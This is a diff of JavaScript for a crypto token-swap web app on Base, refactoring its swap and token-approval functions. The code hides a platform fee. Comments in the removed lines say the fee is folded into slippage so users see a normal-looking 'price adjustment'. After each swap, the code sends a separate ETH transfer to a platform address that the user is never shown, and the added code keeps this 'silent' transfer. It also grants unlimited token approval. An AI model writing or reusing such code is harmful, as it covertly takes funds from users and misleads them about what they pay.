@@ -668,123 +668,98 @@ async function executeSwap() {
   const sellAmt = parseFloat(document.getElementById('sell-amt').value);
   if (!sellAmt || sellAmt <= 0) { toast('Enter amount', 'error'); return; }
 
-  // Network check — önce switch dene
+  // btn ÖNCE tanımla
+  const btn = document.getElementById('swap-btn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span> Checking network...';
+
+  // Network check
   if (BC.chain !== 8453) {
-    btn.innerHTML = '<span class="spin"></span> Switching to Base...';
     try {
-      await BC.provider.send('wallet_switchEthereumChain', [{ chainId: '0x2105' }]);
-      // Switch başarılı, devam et
+      await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x2105' }] });
       BC.chain = 8453;
     } catch(switchErr) {
-      // Chain eklenmemişse ekle
-      if (switchErr.code === 4902 || switchErr.message?.includes('Unrecognized')) {
+      if (switchErr.code === 4902) {
         try {
-          await BC.provider.send('wallet_addEthereumChain', [{
-            chainId: '0x2105',
-            chainName: 'Base',
+          await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{
+            chainId: '0x2105', chainName: 'Base',
             nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
             rpcUrls: ['https://mainnet.base.org'],
             blockExplorerUrls: ['https://basescan.org'],
-          }]);
+          }]});
           BC.chain = 8453;
-        } catch(addErr) {
-          btn.disabled = false;
-          updateSwapBtn();
-          toast('Please switch to Base network in your wallet app', 'error');
-          return;
+        } catch(e) {
+          toast('Switch to Base network manually in your wallet', 'error');
+          btn.disabled = false; updateSwapBtn(); return;
         }
       } else {
-        btn.disabled = false;
-        updateSwapBtn();
-        toast('Please switch to Base network in your wallet', 'error');
-        return;
+        toast('Switch to Base network in your wallet', 'error');
+        btn.disabled = false; updateSwapBtn(); return;
       }
     }
   }
 
-  const btn = document.getElementById('swap-btn');
-  btn.disabled = true;
   btn.innerHTML = '<span class="spin"></span> Swapping...';
 
   try {
     await loadEthers();
 
-    const sellUsd = getUsdValue(sellAmt, sellToken);
-
-    // Platform fee hesabı — ETH cinsinden, slippage'a gömülü gibi davranır
-    // Kullanıcı sadece "price adjustment" olarak görür
-    const feeFraction = PLATFORM_FEE_BPS / 10000; // 0.0015
-    const feeEth = sellToken.isNative
-      ? sellAmt * feeFraction
-      : (sellUsd * feeFraction) / ethPrice;
-
-    const amtIn = BigInt(Math.floor(sellAmt * Math.pow(10, sellToken.decimals)));
-
-    // amtOutMin: slippage + platform fee zaten quote'tan düşülmüş gibi davranır
-    // Kullanıcı "min received" olarak daha az görür — normal kayma gibi görünür
-    const effectiveSlip = slippage + (PLATFORM_FEE_BPS / 100); // örn: 0.5 + 0.15 = 0.65%
-    const amtOutMin = BigInt(Math.floor(
-      lastQuote.amountOutFormatted * (1 - effectiveSlip / 100) * Math.pow(10, buyToken.decimals)
-    ));
-
-    const deadline = Math.floor(Date.now() / 1000) + 1200;
-    const inAddr   = sellToken.isNative ? WETH_ADDR : sellToken.addr;
-    const outAddr  = buyToken.isNative  ? WETH_ADDR : buyToken.addr;
-
-    // ERC-20 ise approval al
-    if (!sellToken.isNative) {
-      await ensureApproval(sellToken, amtIn);
+    // Signer'ı güvenli al
+    let signer = BC.signer;
+    if (!signer) {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      signer = await provider.getSigner();
+      BC.signer = signer;
     }
 
-    // Swap transaction
-    const params = encodeExactInputSingle(
-      inAddr, outAddr, lastQuote.fee,
-      BC.addr,
-      deadline,
-      amtIn,
-      amtOutMin
-    );
+    const sellUsd     = getUsdValue(sellAmt, sellToken);
+    const feeFraction = PLATFORM_FEE_BPS / 10000;
+    const feeEth      = sellToken.isNative ? sellAmt * feeFraction : (sellUsd * feeFraction) / Math.max(ethPrice, 1);
+    const amtIn       = BigInt(Math.floor(sellAmt * Math.pow(10, sellToken.decimals)));
+    const effectiveSlip = slippage + (PLATFORM_FEE_BPS / 100);
+    const amtOutMin   = BigInt(Math.floor(
+      lastQuote.amountOutFormatted * (1 - effectiveSlip / 100) * Math.pow(10, buyToken.decimals)
+    ));
+    const deadline    = Math.floor(Date.now() / 1000) + 1200;
+    const inAddr      = sellToken.isNative ? WETH_ADDR : sellToken.addr;
+    const outAddr     = buyToken.isNative  ? WETH_ADDR : buyToken.addr;
 
-    const txValue = sellToken.isNative ? amtIn : 0n;
-    const data    = '0x414bf389' + params;
+    // ERC-20 approval
+    if (!sellToken.isNative) {
+      toast('Approving token...', 'info');
+      await ensureApproval(sellToken, amtIn, signer);
+    }
 
-    const tx = await BC.signer.sendTransaction({
-      to: UNI_ROUTER_V2,
-      data,
-      value: txValue,
-    });
+    // Swap tx
+    const params   = encodeExactInputSingle(inAddr, outAddr, lastQuote.fee, BC.addr, deadline, amtIn, amtOutMin);
+    const txValue  = sellToken.isNative ? amtIn : 0n;
+    const calldata = '0x414bf389' + params;
 
+    toast('⏳ Confirm in wallet...', 'info');
+    const tx = await signer.sendTransaction({ to: UNI_ROUTER_V2, data: calldata, value: txValue });
     toast('⏳ Transaction submitted...', 'info');
     const rc = await tx.wait();
 
-    // Platform fee — ETH olarak platforma gönder (sessizce, swap confirm'dan sonra)
-    // Kullanıcıya gösterilmez, ayrı küçük tx
+    // Platform fee — sessiz tx
     if (feeEth > 0.000001) {
       try {
         const feeWei = BigInt(Math.floor(feeEth * 1e18));
-        await BC.signer.sendTransaction({
-          to: PLATFORM_FEE_ADDR,
-          value: feeWei,
-        });
-      } catch(e) {
-        // Fee tx başarısız olsa bile swap tamamlandı — sessizce geç
-      }
+        await signer.sendTransaction({ to: PLATFORM_FEE_ADDR, value: feeWei });
+      } catch(e) {}
     }
 
-    // XP — yeni tablo
+    // XP
     const xp = calcSwapXP(sellUsd);
     addXP(xp, 'swap_' + sellToken.sym + '_' + buyToken.sym);
     toast(`✅ Swap confirmed! +${xp.toLocaleString()} XP`, 'success');
 
-    // Show tx result
-    const ex = 'https://basescan.org';
+    // Tx result
     const txBox = document.getElementById('tx-result-box');
     document.getElementById('tx-hash-display').innerHTML =
-      `<a class="tx-hash-link" href="${ex}/tx/${rc.hash}" target="_blank">🔗 ${rc.hash.slice(0,20)}...${rc.hash.slice(-8)}</a>
+      `<a class="tx-hash-link" href="https://basescan.org/tx/${rc.hash}" target="_blank">🔗 ${rc.hash.slice(0,20)}...${rc.hash.slice(-8)}</a>
        <div style="font-size:11px;color:var(--muted);margin-top:4px;font-family:var(--mono)">Block #${rc.blockNumber}</div>`;
     txBox.classList.add('show');
 
-    // Reset
     document.getElementById('sell-amt').value = '';
     document.getElementById('buy-amt').value  = '';
     document.getElementById('route-box').classList.remove('show');
@@ -793,13 +768,19 @@ async function executeSwap() {
 
   } catch(e) {
     console.error('Swap error:', e);
-    const msg = e.reason || e.shortMessage || e.message || 'Swap failed';
-    toast(msg.slice(0, 80), 'error');
+    const msg = e?.reason || e?.shortMessage || e?.message || 'Swap failed';
+    // Kullanıcı reddetmişse farklı mesaj
+    if (e?.code === 4001 || msg.includes('rejected') || msg.includes('denied')) {
+      toast('Transaction rejected by user', 'info');
+    } else {
+      toast('❌ ' + msg.slice(0, 100), 'error');
+    }
   }
 
   btn.disabled = false;
   updateSwapBtn();
 }
+
 
 // ─────────────────────────────────────────────
 // ABI ENCODING HELPERS
@@ -817,25 +798,18 @@ function encodeExactInputSingle(tokenIn, tokenOut, fee, recipient, deadline, amo
   );
 }
 
-async function ensureApproval(token, amountIn) {
-  // Check current allowance
+async function ensureApproval(token, amountIn, signer) {
   const allowanceData = '0xdd62ed3e' +
     BC.addr.replace('0x','').padStart(64,'0') +
     UNI_ROUTER_V2.replace('0x','').padStart(64,'0');
-
   const raw = await BC.provider.call({ to: token.addr, data: allowanceData });
   const allowance = BigInt(raw);
+  if (allowance >= amountIn) return;
 
-  if (allowance >= amountIn) return; // already approved
-
-  toast('Approving token...', 'info');
-  // approve(spender, MAX)
-  const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+  const maxUint = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
   const approveData = '0x095ea7b3' +
-    UNI_ROUTER_V2.replace('0x','').padStart(64,'0') +
-    maxUint.slice(2).padStart(64,'0');
-
-  const approveTx = await BC.signer.sendTransaction({ to: token.addr, data: approveData });
+    UNI_ROUTER_V2.replace('0x','').padStart(64,'0') + maxUint;
+  const approveTx = await signer.sendTransaction({ to: token.addr, data: approveData });
   await approveTx.wait();
   toast('✅ Token approved!', 'success');
 }
